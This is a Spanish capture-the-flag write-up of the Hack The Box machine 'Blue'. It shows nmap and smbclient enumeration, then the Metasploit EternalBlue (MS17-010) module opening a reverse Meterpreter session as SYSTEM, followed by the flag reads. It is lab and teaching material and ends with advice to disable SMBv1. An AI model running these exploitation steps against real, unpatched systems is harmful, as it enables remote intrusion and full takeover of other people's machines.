Blue es la máquina de EternalBlue por excelencia: un Windows 7 al que nunca le aplicaron el parche MS17-010. Un único exploit te da SYSTEM, sin escalada de privilegios.

## Reconocimiento

```console
jaime@kali:~$ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.40
```

Sin contar los puertos altos de RPC quedan tres puertos interesantes:

| Puerto | Servicio |
| --- | --- |
| 135 | msrpc |
| 139 | netbios-ssn |
| 445 | microsoft-ds |

Solo SMB y RPC. Con los scripts de versión saco el sistema y el nombre del equipo:

```console
jaime@kali:~$ nmap -sCV -p135,139,445 10.10.10.40
```

- **Sistema operativo:** Windows 7
- **Hostname:** `haris-PC`

## Enumeración

Listo los recursos compartidos como usuario nulo:

```console
jaime@kali:~$ smbclient -L //10.10.10.40/ -N
```

Aparecen **5 recursos**: `ADMIN$`, `C$`, `IPC$`, `Share` y `Users`. Ninguno da nada por sí solo, pero el script de nmap confirma lo importante:

```console
jaime@kali:~$ nmap -p445 --script smb-vuln-ms17-010 10.10.10.40
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

**MS17-010**, el boletín de Microsoft de 2017 que corrige la ejecución remota de código en SMBv1. Es la misma vulnerabilidad que usó **WannaCry** para propagarse por medio mundo en mayo de 2017.

> MS17-010 agrupa varios CVE. El que explota EternalBlue en esta máquina es CVE-2017-0143.
{: .prompt-info }

## Explotación

El exploit público más cómodo es el módulo de Metasploit:

```console
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(ms17_010_eternalblue) > set LHOST 10.10.14.X
msf6 exploit(ms17_010_eternalblue) > run
```

```
[+] 10.10.10.40:445 - The target is vulnerable.
[*] Meterpreter session 1 opened
```

```console
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

El desbordamiento ocurre en el kernel, así que la sesión llega directamente como **NT AUTHORITY\SYSTEM**. No hay escalada que hacer.

> Si quieres hacerlo sin Metasploit, [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) hace lo mismo con un script de Python y una shell inversa.
{: .prompt-tip }

## Flags

Con SYSTEM las dos flags están a un `type` de distancia:

```console
C:\> type C:\Users\haris\Desktop\user.txt
C:\> type C:\Users\Administrator\Desktop\root.txt
```

## Conclusiones

- SMBv1 no debería estar habilitado en ninguna red moderna: es un protocolo obsoleto y con un historial de vulnerabilidades crítico.
- Un exploit en kernel se salta por completo el modelo de privilegios: no hay usuario intermedio ni escalada.
- `nmap --script smb-vuln-*` resuelve el reconocimiento de SMB en un solo comando. Merece la pena lanzarlo siempre que el 445 esté abierto.
